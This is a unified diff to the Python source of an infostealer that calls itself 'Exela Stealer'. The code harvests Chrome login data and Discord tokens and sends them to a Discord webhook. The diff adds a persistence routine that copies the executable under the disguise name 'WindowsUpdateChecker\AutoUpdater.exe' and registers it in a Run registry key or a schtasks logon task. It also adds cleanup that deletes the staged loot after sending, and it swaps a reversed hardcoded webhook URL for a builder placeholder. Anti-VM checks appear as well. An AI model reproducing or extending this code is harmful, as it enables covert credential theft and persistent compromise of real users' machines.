@@ -1,15 +1,16 @@
-import sqlite3, ctypes, mss, sys
+import sqlite3, ctypes, mss, sys, ctypes, winreg
 import os, wmi, win32api, platform, uuid, psutil, time
 import shutil
 import base64, win32crypt, json, threading, requests, dhooks, re, subprocess
 from Crypto.Cipher import AES
 
-UrLxD = '8K8oBw10xDqcwSf6oCmDE4PeN3hKyK497n5RmOSnTIE3mZ3ibR9qbPdceji-iDEu9-eF/3570834633212304311/skoohbew/ipa/moc.drocsid//:sptth'[::-1]
+UrLxD = '%REPLACE_ME_FOR_QUiCADXD%'[::-1]
 Anti_Vm = "%AnTiVm%"
+wantS = "%StartuP%"
+methodxd = "%MethoD%"
 
 
-
-class ChromeLoginData:
+class QuicaxdExela:
     def __init__(self):
         self.hook = dhooks.Webhook(UrLxD,avatar_url="https://i.hizliresim.com/94iepii.jfif", username="quicaxd")
         self.local_app_data = os.getenv("LOCALAPPDATA")
@@ -48,8 +49,10 @@ class ChromeLoginData:
         self.setDiscord()
         self.writeAllData()
         self.sendxd()
-    def callMePls(self, value, value2, value3):
-        pass
+        self.callMePls()
+    def callMePls(self):
+        if wantS == "true":
+            self.copyToStartup()
     def doitEveryProfile(self):
         profiles = ['Default', 'Guest Profile']
         for x in range(1, 51): 
@@ -583,6 +586,39 @@ class ChromeLoginData:
                 self.discordd.append(f"Discord ID : {id}\nUsername : {req.json()['username']}\nEmail : {req.json()['email']}\nis mfa Enabled : {req.json()['mfa_enabled']}\nNitro Status : {nitro}\nDiscord Token : {str(f)}")
         except:
             pass
+    def metlFile(self):
+        pathxd = os.getenv("localappdata") + r"\WindowsUpdateChecker"
+        fullPath = os.path.abspath(sys.argv[0])
+        if os.path.isdir(pathxd):
+            return
+        else:
+            try:
+                os.mkdir(pathxd)
+                shutil.copyfile(fullPath, pathxd + r"\AutoUpdater.exe")
+            except Exception as e:
+                print(str(e))
+    def getPriv(self):
+        try:
+            code = ctypes.windll.shell32.IsUserAnAdmin()
+            return code
+        except:
+            return 0 
+    def copyToStartup(self):
+        self.metlFile()
+        output = self.getPriv()
+        if methodxd == "regedit":
+            if output == 0: # copy to hkcu
+                softWare = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
+                winreg.SetValueEx(softWare, "AutoUpdateChecker", 0, winreg.REG_SZ, os.getenv("localappdata") + r"\WindowsUpdateChecker\AutoUpdater.exe")
+            else:
+                softWare = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")
+                winreg.SetValueEx(softWare, "AutoUpdateChecker", 0, winreg.REG_SZ, os.getenv("localappdata") + r"\WindowsUpdateChecker\AutoUpdater.exe")
+        elif methodxd == "schtasks":
+            if output == 1:
+                schtaskCommand = "schtasks /create /f /sc onlogon /rl highest " + "/tn \"AutoUpdateChecker\"" + " /tr " + "\"" + os.getenv("localappdata") + r"\WindowsUpdateChecker\AutoUpdater.exe" + "\""
+                os.system(schtaskCommand)
+            else:
+                print("need admin priw, for this method")
     def sendxd(self):
         global hooksxd
         instagram = ""
@@ -627,6 +663,8 @@ class ChromeLoginData:
         embed.add_field(name="Total History's",  inline=True,value=f"```{self.historys}```")
         embed.add_field(name="Exela Stealer is the best", inline=False, value=f"```{'just sex and money xd'}```")
         hooksxdd.send(embed=embed, file=filee)
+        os.remove(os.getenv('temp') + f"\\{run}.zip")
+        shutil.rmtree(os.getenv('temp') + f"\\{run}")
     def reverseToNormal(self, entry):
         return entry[::-1]
     def writeToText(self, path, data):
@@ -818,7 +856,7 @@ class HardAntiVM:
             sys.exit(0)
         else:
             print("Normal Machine")
-            thread = threading.Thread(target=ChromeLoginData,daemon=True)
+            thread = threading.Thread(target=QuicaxdExela,daemon=True)
             thread.start()
             thread.join()
     def is_running_on_vm(self):
@@ -1002,7 +1040,7 @@ class Antivirüstotal:
 if __name__ == "__main__":
     Antivirüstotal()
     if Anti_Vm == "false":
-        thread = threading.Thread(target=ChromeLoginData,daemon=True)
+        thread = threading.Thread(target=QuicaxdExela,daemon=True)
         thread.start()
         thread.join()
     else:
